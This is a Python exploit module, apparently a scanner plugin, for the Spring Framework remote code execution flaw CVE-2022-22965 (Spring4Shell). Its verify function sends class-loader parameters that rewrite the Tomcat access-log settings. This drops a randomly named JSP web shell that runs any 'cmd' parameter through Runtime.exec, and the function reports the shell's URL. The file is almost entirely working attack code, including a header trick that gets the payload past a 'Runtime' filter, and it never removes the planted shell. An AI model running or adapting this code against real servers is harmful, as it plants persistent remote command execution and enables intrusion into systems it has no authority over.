import requests
import re
import random, string
import time, json
import urllib


def verify(url):
    relsult = {
        'name': 'Spring Framework 远程命令执行漏洞(CVE-2022-22965)',
        'vulnerable': False,
        'attack': True,
    }
    post_headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    timeout = 4
    get_headers = {
        "prefix": "<%",
        "suffix": "%>//",
        # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
        "c": "Runtime",
    }
    directory = 'webapps/ROOT'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 7))
    verify_url = urllib.parse.urljoin(url, filename + '.jsp?cmd=')
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    try:
        ret = requests.post(verify_url, headers=get_headers, verify=False, timeout=timeout)
        if ret.status_code == 404 and json.loads(ret.text)['path'] == "/" + filename + ".jsp":
            ret1 = requests.post(url, headers=post_headers, data=file_date_data, verify=False, timeout=timeout)
            if ret1.status_code == 200:
                ret2 = requests.post(url, headers=post_headers, data=exp_data, verify=False, timeout=timeout)
                if ret2.status_code == 200:
                    # Changes take some time to populate on tomcat
                    time.sleep(3)
                    ret3 = requests.get(url, headers=get_headers, verify=False, timeout=timeout)
                    if ret3.status_code == 200:
                        time.sleep(1)
                        pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                        ret4 = requests.post(url, headers=post_headers, data=pattern_data, verify=False, timeout=timeout)
                        time.sleep(5)
                        check = requests.get(verify_url, timeout=timeout)
                        check2 = requests.get(urllib.parse.urljoin(url, ''.join(random.sample(string.digits + string.ascii_letters, 5))), timeout=timeout)
                        if ret4.status_code == 200 and check2.status_code != check.status_code or check.status_code == 500:
                            relsult['vulnerable'] = True
                            relsult['url'] = url
                            relsult['webshell'] = verify_url
                            relsult['about'] = 'https://github.com/reznok/Spring4Shell-POC/blob/master/exploit.py,' \
                                               'https://github.com/liudonghua123/spring-core-rce/blob/main/spring-core-rce-exp.py'
        return relsult
    except:
        return relsult

